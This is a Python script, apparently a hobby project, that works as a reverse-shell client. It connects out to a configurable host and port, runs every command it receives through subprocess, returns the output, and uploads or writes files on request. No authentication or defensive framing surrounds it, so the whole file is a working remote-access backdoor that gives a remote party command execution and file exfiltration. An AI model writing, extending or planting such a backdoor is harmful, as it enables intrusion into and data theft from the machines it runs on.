import socket
import os
import subprocess
import sys
import time

HOST = "0.0.0.0"  # The server's hostname or IP address
PORT = 50000

FILE_BUFFER_SIZE = 2048

FORMAT = 'UTF-8'


def modeController(socket):
    command = socket.recv(1024).decode(FORMAT)
    splitCommand = command.split()
    if command == "close":
        return 0
    elif splitCommand[0].lower() == "upload":  # TODO : error is here check for changed values and such
        print("Upload")
        fileDownload(socket, splitCommand)
        splitCommand.clear()
        return 1
    elif splitCommand[0].lower() == "download":
        fileUpload(socket, splitCommand)
        splitCommand.clear()
        return 1
    elif splitCommand[0].lower() == "cd":
        changeDirectory(socket, splitCommand)
        splitCommand.clear()
        return 1
    else:
        print("Normal")
        normalCommand(socket, command)
        return 1


# for all command except download, upload and cd
def normalCommand(socket, command):
    message = (subprocess.getoutput(command) + '\n').encode(FORMAT)
    if message.decode() == "":
        message = "Done!".encode(FORMAT)
    print(f"Received {command!r}")
    socket.sendall(message)


# file upload from client to server
def fileUpload(connection, splitCommand):
    try:
        with open(splitCommand[1], "rb") as targetFile:
            while True:
                readData = targetFile.read(1024)
                if not readData:
                    time.sleep(0.3)
                    connection.sendall('\0'.encode(FORMAT))
                    break
                connection.sendall(readData)
                time.sleep(0.3)
            time.sleep(0.3)
    except FileNotFoundError:
        pass


# file download from server to client
def fileDownload(connection, splitCommand):
    fileName = splitCommand[1].split('/')
    print(fileName)
    fileName = '/' + fileName[len(fileName) - 1]
    print(splitCommand[2] + fileName)
    try:
        with open(splitCommand[2] + fileName, "wb") as file:
            while True:
                print(1)
                dataRead = connection.recv(1024)
                # TODO : file restriction size
                print(repr(dataRead))
                if dataRead.decode().lower() == '\0':
                    print(2)
                    break
                file.write(dataRead)
            connection.sendall("File Downloaded!".encode(FORMAT))
    except FileNotFoundError:
        connection.sendall("File Not Found!".encode(FORMAT))
    time.sleep(0.3)


#  TODO : client halts after sending file server is waiting to recieve cwd client concatenates cwd and file result
# for cd
def changeDirectory(socket, command):
    try:
        os.chdir(' '.join(command[1:]))
    except FileNotFoundError as e:
        # if there is an error, set as the output
        output = str(e)
    else:
        # if operation is successful, empty message
        output = ""
    cwd = os.getcwd()
    message = f"{output} {cwd}"
    socket.sendall(message.encode(FORMAT))


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    connectionStatus = 1
    s.sendall(os.getcwd().encode(FORMAT))
    while connectionStatus:
        connectionStatus = modeController(s)
        time.sleep(0.1)
        s.sendall(os.getcwd().encode(FORMAT))

    s.close()
